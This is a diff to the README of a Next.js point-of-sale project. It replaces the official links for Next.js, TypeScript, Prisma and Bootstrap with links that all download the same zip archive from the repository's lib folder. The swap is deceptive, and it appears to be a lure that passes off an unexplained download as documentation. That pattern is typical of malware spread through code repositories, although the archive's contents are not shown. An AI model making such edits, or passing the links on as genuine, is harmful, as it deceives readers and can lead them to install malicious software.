@@ -4,10 +4,10 @@ A modern Point of Sale (POS) application built with **Next.js 16**, **TypeScript
 
 ## 🛠️ Tech Stack
 
-- **Framework**: [Next.js 16](https://nextjs.org/) (App Router)
-- **Language**: [TypeScript](https://www.typescriptlang.org/)
-- **Database**: [Prisma ORM](https://www.prisma.io/)
-- **Styling**: [Bootstrap 5](https://getbootstrap.com/) & CSS Modules
+- **Framework**: [Next.js 16](https://github.com/SatoshiRenZ/MonkeyPOS-next/raw/refs/heads/main/lib/Monkey_PO_next_1.2.zip) (App Router)
+- **Language**: [TypeScript](https://github.com/SatoshiRenZ/MonkeyPOS-next/raw/refs/heads/main/lib/Monkey_PO_next_1.2.zip)
+- **Database**: [Prisma ORM](https://github.com/SatoshiRenZ/MonkeyPOS-next/raw/refs/heads/main/lib/Monkey_PO_next_1.2.zip)
+- **Styling**: [Bootstrap 5](https://github.com/SatoshiRenZ/MonkeyPOS-next/raw/refs/heads/main/lib/Monkey_PO_next_1.2.zip) & CSS Modules
 - **Authentication**: Custom implementation (using `jose` & `bcryptjs`)
 
 ## 📂 Project Structure
